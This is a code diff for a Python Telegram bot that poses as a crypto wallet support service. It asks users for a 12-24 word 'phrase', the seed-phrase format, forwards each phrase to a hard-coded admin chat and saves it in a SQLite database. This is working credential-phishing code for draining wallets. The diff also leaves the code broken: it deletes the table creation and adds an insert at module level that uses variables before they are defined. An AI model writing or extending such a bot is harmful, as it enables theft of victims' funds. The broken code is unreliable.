@@ -23,16 +23,14 @@ ADMIN_ID = 6244946735
 # Initialize SQLite
 conn = sqlite3.connect('support_requests.db', check_same_thread=False)
 cursor = conn.cursor()
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS requests (
-        user_id TEXT PRIMARY KEY,
-        issue TEXT,
-        platform TEXT,
-        phrase TEXT,
-        timestamp TEXT
+try:
+    cursor.execute(
+        'INSERT OR REPLACE INTO requests (user_id, issue, platform, phrase, timestamp) VALUES (?, ?, ?, ?, ?)',
+        (str(user_id), user_state[user_id]["issue"], user_state[user_id]["platform"], text, datetime.utcnow().isoformat())
     )
-''')
-conn.commit()
+    conn.commit()
+except Exception as e:
+    logger.error(f"Failed to store in SQLite: {str(e)}")
 
 # List of supported platforms with emojis
 PLATFORMS = [
@@ -123,15 +121,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if 12 <= len(words) <= 24 and all(re.match(r"^[a-z0-9]+$", word) for word in words):
             user_state[user_id]["phrase"] = text
             user_state[user_id]["step"] = "completed"
-            # Store in SQLite
-            try:
-                cursor.execute(
-                    'INSERT OR REPLACE INTO requests (user_id, issue, platform, phrase, timestamp) VALUES (?, ?, ?, ?, ?)',
-                    (str(user_id), user_state[user_id]["issue"], user_state[user_id]["platform"], text, datetime.utcnow().isoformat())
-                )
-                conn.commit()
-            except Exception as e:
-                logger.error(f"Failed to store in SQLite: {str(e)}")
             # Notify user
             await update.message.reply_text(
                 "✅ Thank you! Your request has been submitted. An agent will contact you shortly.\n"
@@ -144,6 +133,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 chat_id=ADMIN_ID,
                 text=f"📬 New support request:\nUser ID: {user_id}\nIssue: {issue}\nPlatform: {platform}\nPhrase: {text}"
             )
+            # Store in SQLite (optional, consider removing for security)
+            try:
+                cursor.execute(
+                    'INSERT OR REPLACE INTO requests (user_id, issue, platform, phrase, timestamp) VALUES (?, ?, ?, ?, ?)',
+                    (str(user_id), user_state[user_id]["issue"], user_state[user_id]["platform"], text, datetime.utcnow().isoformat())
+                )
+                conn.commit()
+            except Exception as e:
+                logger.error(f"Failed to store in SQLite: {str(e)}")
         else:
             await update.message.reply_text(
                 f"❌ Invalid phrase: '{text}'. Must be 12-24 words, using only lowercase letters and numbers. Please try again."
